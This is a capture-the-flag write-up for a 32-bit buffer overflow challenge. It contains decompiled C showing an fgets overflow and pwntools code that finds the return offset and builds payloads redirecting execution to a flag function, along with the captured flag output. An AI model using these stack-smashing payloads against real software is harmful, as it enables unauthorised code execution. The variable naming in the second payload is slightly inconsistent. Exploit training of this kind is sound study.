@@ -1,0 +1,71 @@
+Decompiling with ghidra shows us a buffer overflow in reading in the username
+
+void menu(int param_1)
+
+{
+   char local_1c [20];
+   
+   if (param_1 == L'\xcafed00d') {
+      puts("censored_the_flag\ngoodbye, admin\n");
+      fflush(_stdout);
+   }
+   else {
+      puts("Welcome, new user!");
+      puts("What username would you like to use?");
+      fflush(_stdout);
+      fgets(local_1c,0xff,_stdin);
+      puts(local_1c);
+      puts("registered! goodbye.");
+      fflush(_stdout);
+   }
+   return;
+}
+
+We then use a cyclic patern to fill the buffer and find the offset of the return from the coredump
+
+pattern = cyclic(300)
+
+# Send the pattern to the binary
+io = process('./censored_chal')  # Replace './binary' with your local binary
+io.sendline(pattern)
+io.wait()  # Wait for the process to crash
+
+# Find the offset
+core = io.corefile  # Get the core dump
+eip_value = core.eip  # Extract the crashed EIP value
+offset = cyclic_find(eip_value)
+print(f"Offset: {offset}")
+
+
+And then we replace the return value with the address of getflag
+
+
+payload = b'A' * offset
+
+payload += p32(read_flag_addr)
+
+# Establish connection to the remote service
+p = remote(HOST, PORT)
+# binary = './censored_chal'
+# elf = ELF(binary)
+# p = process(binary)
+
+# Receive the initial greeting and prompts
+p.recvuntil('What username would you like to use?\n')
+
+# Send the payload as the username
+p.sendline(payload)
+
+For the second flag we instead need to jump back through menu again but with the argument replaced. Since this is ia32 all args are passed on the stack so we just overwrite the return adress +8
+
+
+payload = b'A' * offset
+
+payload += p32(read_flag_addr)
+payload += p32(0)
+payload += p32(0xcafed00d)
+
+
+registered! goodbye.
+osu{args_or_ret?}
+goodbye, admin
